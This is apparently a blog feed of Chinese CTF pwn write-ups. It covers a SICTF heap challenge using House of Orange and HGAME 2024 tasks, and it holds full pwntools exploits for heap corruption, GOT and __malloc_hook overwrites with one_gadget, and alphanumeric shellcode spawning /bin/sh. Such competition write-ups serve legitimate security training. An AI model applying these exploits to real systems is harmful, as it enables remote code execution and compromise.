4710017434214644199415756584929214239679433211393230307782953067246529626136446314941258877439356094775337541321331600788042698664632064112896956898222397445497695982546922871549828242938368486774617350420790711093069910914135319635330786253331223459637232106417577225350441291</span></span><br><span class="line">p = <span class="number">16486456392568284654575447481741337432037045210800881835922614280067095597403710005455885867829534599108105197853120121574779191481125315722964257888873579099800690068397728960335561315717619132097747891006990987234219773215951341290375325467839650020485843410133760476863038747605417567970738312428198804291743647184526806692092507258393049800262129700391618652453916902141512582838357424455278388992820311182042750759628796263458005206211851622898042001270110860445227518098099442496544291487453616861604254291750411887857595093636553437331170435660475454672143330589299824376076547689051724844786337326281769222107417355877587836699896745726567628092282995399905968099655245359825181671342180522153867520458557378100805495885728965517124749113185924078688116625743891547407248459361185534137655598794841381345072595952173547088910141316887889085791098603541066183857855045537851225348728432140633429582547355875169018387146998010651697236311238281309072462571334886501953441278420091394620498419461947569630534013992500053942893075863031452593127978173868322268503740398804653340332478754797272662812261231775395620689300949393859423566492311584685742006804194387349833713097736389655660701086473349762351032974011890884285149086019</span> </span><br><span class="line">q = <span class="number">20074765917385746960935546244046943454462816043103272528361092579826674512173765241930755746125701611787832050933381141287876969868161022364171839735197812750520430729316788310479069323911390204105953536522038545353910488349500120367222425966798487691717708110938190921291433703777234979917798631930961003842873264252345740246004565354378673284300771278077629291983142857452945395644496169376540506242324806217396415838590757988653416655884020806407076836843763182293453375883193557418497971808909707169877529993060558008071543221829096316946680943004116896967543999782332968077171180309491946947119885153993121862489</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q*p = &#x27;</span>,q*p,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> n == p*q:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n == p * q&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n != p * q&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(n-p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n-q = &#x27;</span>,n-q,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023SICTF-Pwn-baby_heap-wp</title>
    <url>/2023/09/22/comp%20-%202023SICTF-Pwn-baby_heap-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
baby一点都不baby...houseoforange+unsortedbinattack
</blockquote>
<span id="more"></span>
<h1 id="x00-逆向分析">0x00 逆向分析</h1>
<ol type="1">
<li>main函数很简单，1申请2编辑3打印，但是没有free，google'no free
pwn'了解到有可能是houseoforange</li>
<li>add函数，两个约束（1. 最多申请32个chunk 2.
chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin
attack或者unsortedbin
attack来打（但这里没有free，就导致fastbin很难利用） <img
src="/pic/Pasted%20image%2020230922101040.png" /></li>
<li>edit函数 <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
<li>show函数，只打印了8个字节就很难受 <img
src="/pic/Pasted%20image%2020230922101901.png" /></li>
</ol>
<h1 id="x01-思路分析">0x01 思路分析</h1>
<ol type="1">
<li>我们肯定是要实现“leak libc”和“Any Address Write”
<ol type="1">
<li>leak libc
<ol type="1">
<li>思路1：unsortedbin leak
<ol type="1">
<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
</ol></li>
<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
</ol></li>
<li>Any Address Write
<ol type="1">
<li>思路1：常规unsortedbin attack
<ol type="1">
<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
</ol></li>
<li>思路2：unsortedbin 申请 fake_chunk
<ol type="1">
<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
</ol></li>
</ol></li>
</ol></li>
<li>将写入的got表改写为og即可提权</li>
</ol>
<h1 id="x02-具体步骤">0x02 具体步骤</h1>
<ol type="1">
<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  alloc(<span class="number">0x100</span>,payload) <span class="comment"># chunk0 - chunk15</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x111</span>,payload)   <span class="comment"># chunk16</span></span><br><span class="line">alloc(<span class="number">1</span>,payload)       <span class="comment"># chunk17</span></span><br></pre></td></tr></table></figure></li>
<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xdc1</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x1000</span>,payload) <span class="comment">#18</span></span><br></pre></td></tr></table></figure></li>
<li>伪造victim.bk = 0x4040c8（fake_chunk_head） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + flat(<span class="number">0x111</span>,<span class="string">b&#x27;deadbeef&#x27;</span>,<span class="number">0x4040c8</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure></li>
<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">payload = p64(libc_base + one_gadget[<span class="number">3</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x03-一些问题">0x03 一些问题</h1>
<p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br />
Q2：
我感觉申请8个chunk就够了...把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
<h1 id="x04-完整exp">0x04 完整EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./baby_heap&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./baby_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># --------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  alloc(<span class="number">0x100</span>,payload) <span class="comment"># chunk0 - chunk15</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x111</span>,payload)   <span class="comment"># chunk16</span></span><br><span class="line">alloc(<span class="number">1</span>,payload)       <span class="comment"># chunk17</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xdc1</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x1000</span>,payload) <span class="comment">#18</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + flat(<span class="number">0x111</span>,<span class="string">b&#x27;deadbeef&#x27;</span>,<span class="number">0x4040c8</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">payload = p64(libc_base + one_gadget[<span class="number">3</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2024hgame-wp</title>
    <url>/2024/02/14/comp%20-%202024hgame-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
谁除夕和情人节还在加班写 wp 啊😭2024要脱离 game 级别！
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ul>
<li><a href="#week1">Week 1</a>
<ul>
<li><a href="#pwn">Pwn</a></li>
</ul></li>
<li><a href="#week2">Week 2</a>
<ul>
<li><a href="#pwn---ak">Pwn</a></li>
<li><a href="#rev">Rev</a></li>
</ul></li>
</ul>
<h1 id="week1">Week1</h1>
<p>week1 在做项目，把这事给忘了，做 week2 的时候为了找灵感做了一下 week1
的 ezshellcode</p>
<h2 id="pwn">Pwn</h2>
<h3 id="ezshellcode">ezshellcode</h3>
<p>alphanumeric shellcode <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ae64 import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:30657&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">io.sendlineafter(&#x27;input the length of your shellcode:&#x27;,str(-1))</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = AE64().encode(payload,&#x27;rax&#x27;,0,&#x27;small&#x27;)</span><br><span class="line">print(payload.decode(&#x27;latin-1&#x27;))</span><br><span class="line">io.sendafter(&#x27;input your shellcode:&#x27;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="week2">Week2</h1>
<h2 id="pwn---ak">Pwn - AK</h2>
<h3 id="fastnote">fastnote</h3>
<p>libc-2.31，填满 tcachebin 的 unsortedbin leak + fastbin attack
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;47.102.130.35:31898&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload = &#x27;A&#x27;*4</span><br><span class="line">for i in range(8):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0-6 tcachebin, chunk7: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(8,0x10,payload) # 防annex</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">   free(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0-6 tcachebin</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27;*7</span><br><span class="line">alloc(7,0x08,payload) # 因为 read 函数貌似会把 chunk 内部用 &#x27;\x00&#x27; 填满，所以只申请0x08，可以留下 bk 里的信息</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - 0x80 - 0x60</span><br><span class="line">main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print(&quot;main_arena   ---&gt;   &quot;,hex(main_arena))</span><br><span class="line">print(&quot;main_arena_offset   ---&gt;   &quot;,hex(main_arena_offset))</span><br><span class="line">print(&quot;libc_base    ---&gt;   &quot;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">alloc(0,0x60,payload) # 申请 unsortedbin 里面的 chunk，便于后面 alloc</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*8</span><br><span class="line">for i in range(9):</span><br><span class="line">  alloc(i,0x10,payload) # chunk0-6:&quot;7 tcachebin chunks&quot;  || chunk7,8:&quot;fastbin chunk&quot;</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">  free(i) # free(0-6) free(7,8)</span><br><span class="line"></span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io) # state1</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">  alloc(i,0x10,payload) # chunk0-6: 清空tcachebin</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&quot;malloc_addr    ---&gt;   &quot;,hex(malloc_addr))</span><br><span class="line">payload = p64(malloc_addr)</span><br><span class="line">alloc(7,0x10,payload) # chunk7: 劫持由fastbin生成的tcachebin链</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(7))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">alloc(8,0x10,payload) # chunk8: chunk8</span><br><span class="line">one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]</span><br><span class="line">payload = p64(libc_base + one_gadget[1])</span><br><span class="line">alloc(9,0x10,payload) # chunk9: Any Address</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line"># alloc(10,0x10,payload) # getshell</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="old_fastnote">old_fastnote</h3>
<p>libc-2.23，unsortedbin leak + fastbin attack，注意 fastbin chunk 的
size 域构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:32449&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload = &#x27;A&#x27;*4</span><br><span class="line">for i in range(1):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(1,0x10,payload) # chunk1 防annex</span><br><span class="line"></span><br><span class="line">for i in range(1):</span><br><span class="line">   free(i)</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27;*7</span><br><span class="line">alloc(0,0x08,payload) # 因为 read 函数貌似会把 chunk 内部用 &#x27;\x00&#x27; 填满，所以只申请0x08，可以留下 bk 里的信息</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">main_arena = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - 0x80 - 88</span><br><span class="line">main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print(&quot;main_arena   ---&gt;   &quot;,hex(main_arena))</span><br><span class="line">print(&quot;main_arena_offset   ---&gt;   &quot;,hex(main_arena_offset))</span><br><span class="line">print(&quot;libc_base    ---&gt;   &quot;,hex(libc_base))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(0,0x60,payload) # 申请 unsortedbin 里面的 chunk，便于后面 alloc</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*8</span><br><span class="line">for i in range(2):</span><br><span class="line">  alloc(i,0x60,payload) # chunk0,1:&quot;fastbin chunk&quot;</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">  free(i) # free(0,1)</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io) # state1</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0xb - 0x18</span><br><span class="line">print(&quot;malloc_addr    ---&gt;   &quot;,hex(malloc_addr))</span><br><span class="line">payload = p64(malloc_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(7))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">alloc(8,0x60,payload) # chunk8: chunk8</span><br><span class="line">alloc(9,0x60,payload) # chunk9: Any Address</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">payload = b&#x27;\x00&#x27;*19 + payload</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="eldenring2">eldenRing2</h3>
<p>必须 patch 才能运行 vuln，用给的 libc.so.6 测试出来是 libc-2.31。</p>
<p>做法跟 fastnote 一样，填满 tcachebin 的unsortedbin leak + fastbin
attack</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:32672&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(ip[0],int(ip[1]))</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1)) </span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index)) # 最多16个idx，不能重复使用</span><br><span class="line">  